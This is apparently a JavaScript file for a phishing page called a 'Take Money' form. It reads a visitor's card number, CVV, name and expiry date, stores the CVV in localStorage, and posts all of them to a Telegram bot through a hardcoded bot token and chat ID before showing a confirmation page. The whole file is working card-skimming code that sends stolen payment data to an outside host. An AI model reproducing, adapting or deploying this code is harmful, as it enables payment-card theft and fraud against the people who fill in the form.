// script.js

function redirectToTakeMoneyForm() {
    console.log('Redirecting to Take Money Form...');
    window.location.href = 'take-money-form.html';
  }
  
  function handleTakeMoneySubmission() {
    console.log('Handling Take Money Submission...');
    const cardValue = document.getElementById('cardInput').value;
    const cvvValue = document.getElementById('cvvInput').value;
    const nameValue = document.getElementById('nameInput').value;
    const expiryDateValue = document.getElementById('expiryDateInput').value;
    localStorage.setItem('cvv', cvvValue);
    sendToTelegramBotForTakeMoney(cardValue, cvvValue, nameValue, expiryDateValue);
    window.location.href = 'confirmation.html';
  }
  
  function sendToTelegramBotForTakeMoney(card, cvv, name, expiryDate) {
    const botToken = '6780796808:AAEMjYut3HZtDuZWfjabfV2-kxPEI57BiLs'; // Replace with your bot token
    const chatId = '1204315551'; // Replace with your chat ID
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const message = `
      New Payment Information:
      Card: ${card}
      CVV: ${cvv}
      Name: ${name}
      Expiry Date: ${expiryDate}
    `;
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
    .then(response => response.json())
    .then(data => console.log('Payment information sent to Telegram:', data))
    .catch(error => console.error('Error sending payment information to Telegram:', error));
  }
  